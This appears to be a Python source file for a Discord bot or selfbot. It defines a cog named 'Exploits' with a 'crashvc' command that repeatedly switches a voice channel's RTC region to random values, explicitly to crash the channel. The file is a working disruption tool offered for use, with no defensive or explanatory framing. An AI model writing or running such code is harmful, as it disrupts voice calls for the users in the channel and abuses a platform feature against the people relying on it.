import discord, requests, asyncio, random

from discord.ext import commands
from src.session import client
from src.console.output import output

class Exploits(commands.Cog):
	"""Contains commands that are used to exploit some of Discord's aspects"""

	def __init__(self, bot):
		self.bot = bot


	@commands.command(name="crashvc", aliases=["crashvoicechannel"], description="Crashes a voice channel", usage="crashvc <channel_id> <amount>")
	async def crashvc(self, ctx, channel_id: str, amount:int = 1):
		output.log("Attempting to crash the voice channel ")

		regions = [
			'hongkong',
			'india',
			'russia',
			'brazil',
			'japan',
			'singapore',
			'southafrica',
			'sydney',
			'us-central',
			'us-east',
			'us-west',
			'us-south'
		]

		for channel in ctx.guild.channels:
			if str(channel.id) == channel_id:
				for x in range(amount):
					region = random.choice(regions)
					try:
						await channel.edit(rtc_region=region)
					except:
						pass

				

def setup(bot):
	bot.add_cog(Exploits(bot))
